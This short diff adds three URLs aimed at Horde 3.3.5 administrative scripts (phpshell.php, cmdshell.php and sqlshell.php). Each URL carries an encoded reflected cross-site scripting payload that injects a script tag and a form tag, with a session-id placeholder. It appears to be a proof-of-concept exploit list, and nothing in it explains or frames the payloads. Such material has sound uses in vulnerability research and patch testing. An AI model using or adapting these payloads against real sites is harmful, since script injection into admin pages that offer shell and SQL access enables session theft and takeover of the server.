@@ -1,0 +1,3 @@
+http://www.example.com/horde-3.3.5/admin/phpshell.php/%22%3E%3Cscript%3Ealert%288%29;%3C/script%3E%3Cform%20/?Horde=&amp;lt;sessid&amp;gt;
+http://www.example.com/horde-3.3.5/admin/cmdshell.php/%22%3E%3Cscript%3Ealert%288%29;%3C/script%3E%3Cform%20/?Horde=&amp;lt;sessid&amp;gt;
+http://www.example.com/horde-3.3.5/admin/sqlshell.php/%22%3E%3Cscript%3Ealert%288%29;%3C/script%3E%3Cform%20/?Horde=&amp;lt;sessid&amp;gt;
